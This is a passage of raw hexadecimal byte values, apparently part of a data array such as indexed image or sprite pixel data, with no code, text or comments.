0x9E, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D,
0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x08,
0x14, 0x12, 0x11, 0x11, 0x11, 0x12, 0xCA, 0xE3, 0xE3, 0x14, 0x08, 0x9B, 0x9D, 0x9C, 0x9C, 0x9C,
0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x9D, 0x08, 0xCD, 0xCF, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0x12, 0x12, 0xE4, 0x9D, 0x18, 0x18, 0x18,
0x18, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17,
0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C,
0x17, 0x17, 0x17, 0x12, 0xCF, 0xE8, 0xE9, 0xEA, 0xE9, 0xE8, 0xE8, 0xE8, 0xE9, 0xEA, 0xE6, 0xE7,
0xD0, 0x12, 0x12, 0xE6, 0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9D, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x08, 0x9F,
0x9B, 0x9D, 0x9E, 0x9E, 0x9C, 0x17, 0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9E,
0x08, 0x9E, 0x9D, 0x18, 0x18, 0x18, 0x17, 0x9C, 0x9C, 0x17, 0x9C, 0x08, 0x08, 0x9B, 0x17, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9D, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x9A, 0x9A, 0x9A, 0x9B, 0x16, 0x17, 0x17, 0x18,
0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9E, 0x9E, 0x9E, 0x9A, 0x9E,
0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C,
0x9D, 0x9B, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F,
0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9B, 0x9D, 0x9D, 0x9B, 0x9B,
0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x08, 0x08, 0x08, 0x14,
0x13, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCA, 0x13, 0xE3, 0x14, 0x08, 0x16, 0x9D, 0x9C, 0x9C, 0x17,
0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17,
0x08, 0xCD, 0xCE, 0xCF, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0x12, 0xCE, 0x08, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9C, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0xCF, 0xE8, 0xCF, 0xE7, 0xE6, 0xE8, 0x12, 0x12, 0x12, 0xD0, 0xE7, 0xE6, 0xE7,
0xCF, 0x12, 0x11, 0xCF, 0xE5, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x9E, 0x9A, 0x9E, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D,
0x9D, 0x9F, 0x08, 0x08, 0x9D, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9B, 0x9E,
0x9C, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9D, 0x08, 0xE4, 0xE3, 0x14, 0x14, 0x14, 0x14, 0xE4,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x9A, 0x9B, 0x17, 0x17,
0x17, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9B, 0x9E, 0x9B,
0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B,
0x9B, 0x9B, 0x9B, 0x9C, 0x9C, 0x9C, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E, 0x9A, 0x9A, 0x08, 0x14,
0xCF, 0x11, 0x11, 0x11, 0x11, 0x12, 0xCA, 0xE2, 0xE4, 0x08, 0x9A, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C,
0x08, 0xCE, 0xCE, 0xCE, 0xCE, 0xCF, 0x12, 0x12, 0x12, 0xCF, 0xE4, 0x9D, 0x17, 0x18, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0xE8, 0xE8, 0xCF, 0xCF, 0xE7, 0xE6, 0xE6, 0xE8, 0xE8, 0xE7, 0xE7, 0xE8, 0xCF,
0x12, 0x12, 0x11, 0x12, 0xCE, 0xE5, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x08,
0x9B, 0x9D, 0x9E, 0x08, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x17, 0x9C,
0x9C, 0x18, 0x18, 0x9D, 0x08, 0x08, 0x9D, 0x17, 0x17, 0x9C, 0x17, 0x18, 0x18, 0x17, 0x17, 0x9C,
0x9C, 0x9C, 0x9C, 0x17, 0x18, 0x17, 0x9A, 0x14, 0x14, 0x14, 0xE3, 0xCF, 0x12, 0x12, 0xE6, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2,
0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x99, 0x99, 0x9A, 0x9A,
0x9B, 0x9B, 0x9A, 0x9B, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D,
0x17, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9B, 0x9A, 0xE4,
0x12, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x14, 0x14, 0x14, 0x08, 0x9A, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x9E,
0x14, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0xCE, 0x08, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x17, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8, 0xE8, 0xCF, 0xCF, 0xCF, 0xCF,
0x12, 0x12, 0x12, 0x12, 0xCE, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE5, 0xE5, 0xE5, 0xE5,
0xE5, 0xE5, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x08, 0x9E, 0x9B,
0x9D, 0x9D, 0x9E, 0x9E, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9C, 0x17, 0x17, 0x18, 0x18, 0x9C, 0x08, 0x9A, 0x9C, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x08, 0x08, 0x14, 0xE4, 0xE3, 0x13, 0x12, 0x12, 0xE2, 0xE2,
0xCA, 0xE1, 0xCA, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0xE1, 0xE1, 0xE1, 0xE1, 0xE2, 0xE2, 0xE2,
0xE1, 0xE1, 0xE2, 0xE2, 0xE2, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x99, 0x9B,
0x17, 0x9B, 0x08, 0x08, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x17,
0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9A, 0xE4,
0x12, 0x12, 0x11, 0x12, 0x13, 0x14, 0x08, 0x08, 0x08, 0x9C, 0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9E, 0x9A, 0x08, 0x08, 0x08, 0x9E, 0x9D, 0x14,
0xCD, 0xCF, 0xCE, 0xCF, 0xCE, 0xCF, 0xCF, 0x12, 0x12, 0xE5, 0x9D, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C,
0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C,
0x9D, 0x9D, 0x9D, 0xE8, 0xE8, 0xE7, 0xCF, 0x12, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0xCF, 0x14, 0x08, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x86, 0x86, 0x86, 0x86, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x08, 0x08, 0x9E, 0x9B, 0x9E, 0x9D,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9D, 0x9E, 0x08, 0x14, 0x08, 0x08, 0x9E, 0x9D, 0x9D, 0x9A, 0x08,
0x08, 0x08, 0x08, 0x9A, 0x9B, 0x9C, 0x9A, 0x08, 0x08, 0x14, 0xE4, 0xE4, 0xE3, 0xE3, 0xE3, 0xE2,
0xCA, 0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xE0, 0xCA, 0xCA, 0xCA, 0xCA, 0xE1, 0xE1, 0xE1, 0xE1,
0xE1, 0xE1, 0xE1, 0xE2, 0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0xE4, 0x14, 0x14, 0x08, 0x08, 0x08, 0xE3,
0x08, 0x9A, 0x08, 0x9A, 0x9B, 0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9B, 0x9B, 0x17,
0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x08, 0xE6,
0x12, 0x11, 0x11, 0x12, 0xE3, 0x14, 0x08, 0x08, 0x9E, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9B, 0x08, 0xE3, 0xCA, 0x12, 0xCF, 0x14, 0x9E, 0x08, 0xE5,
0xCE, 0xCA, 0xCE, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0xCE, 0x14, 0x9D, 0x17, 0x17, 0x17, 0x18, 0x17,
0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17,
0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x9C,
0x9C, 0x9C, 0x9E, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x14, 0x16, 0x16, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C, 0x9D,
0x08, 0x14, 0x14, 0x08, 0x14, 0x14, 0x14, 0x08, 0x9B, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x9A, 0x9E,
0x9E, 0x9B, 0x9B, 0x9A, 0x9B, 0x9D, 0x9D, 0x9C, 0x9D, 0x08, 0xE4, 0xE4, 0x14, 0x08, 0xE4, 0xCE,
0xCE, 0xE4, 0x08, 0x9B, 0x9A, 0x08, 0x14, 0x14, 0x14, 0x14, 0xE3, 0xE3, 0xE2, 0xE3, 0xE3, 0xE3,
0xE2, 0xCA, 0xCA, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA,
0xE0, 0xE1, 0xE1, 0xE1, 0xE2, 0xE2, 0xE3, 0xE3, 0xE4, 0x14, 0x14, 0x08, 0x99, 0x08, 0xCA, 0xE3,
0x08, 0x9A, 0x08, 0x08, 0x08, 0x9A, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x16, 0x17,
0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9C, 0x9A, 0x14, 0xCA,
0x11, 0x11, 0x11, 0x12, 0x14, 0x14, 0xE4, 0xE3, 0x14, 0x08, 0x16, 0x9C, 0x17, 0x17, 0x17, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9C, 0x16, 0x9D, 0x9D, 0x9E, 0x08,
0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x9A, 0x9C, 0x17, 0x17, 0x17, 0x18, 0x18,
0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x9C, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x9E, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x12, 0x14, 0x16, 0x16, 0x9E, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C,
0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x08, 0x9A, 0x9E,
0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9D, 0x9B, 0x9C, 0x9C, 0x9B, 0x08, 0xE4, 0xE4, 0x14,
0x08, 0x99, 0x9A, 0x08, 0x08, 0x14, 0xE4, 0xE4, 0x14, 0x14, 0xE4, 0xE4, 0xE3, 0xE3, 0xE2, 0xE2,
0xE2, 0x14, 0x99, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x08, 0xCA, 0xE2, 0x14, 0x99, 0x9A,
0x99, 0x14, 0xE3, 0xE2, 0xE2, 0xE2, 0xE3, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x9A, 0x9A, 0x9B,
0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9E, 0x9F, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x9A, 0x17,
0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9C, 0x08, 0xE5, 0x12,
0x11, 0x11, 0x11, 0xCA, 0x08, 0x14, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0x13, 0xE4, 0x14,
0x9A, 0x9C, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x9D, 0x9D, 0x9D,
0x9D, 0x9C, 0x17, 0x18, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x17, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x11, 0x11, 0x11, 0x12, 0xE4, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x9A, 0x08, 0xE4, 0xE3,
0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE2, 0xE2, 0xE1, 0xE3,
0x08, 0x18, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x18, 0x18, 0x07, 0x1B, 0x1C,
0x1C, 0x1B, 0x07, 0x18, 0x99, 0x14, 0x14, 0x08, 0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9B, 0x17,
0x17, 0x17, 0x17, 0x18, 0x18, 0x17, 0x9E, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x9D, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x08, 0x14, 0xE5, 0xE6, 0xE6, 0xE7, 0xE7,
0xE7, 0xE7, 0xE7, 0x13, 0xE7, 0xE6, 0xE6, 0xE5, 0xE5, 0xE5, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x9A, 0x9C,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x9E, 0x14, 0xCA, 0x12,
0x11, 0x11, 0x12, 0xE6, 0x14, 0xE3, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0xCF, 0xE5, 0x14, 0x08, 0x16, 0x17, 0x17, 0x18, 0x17, 0x17, 0x9C, 0x17,
0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0xE5, 0x9F, 0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
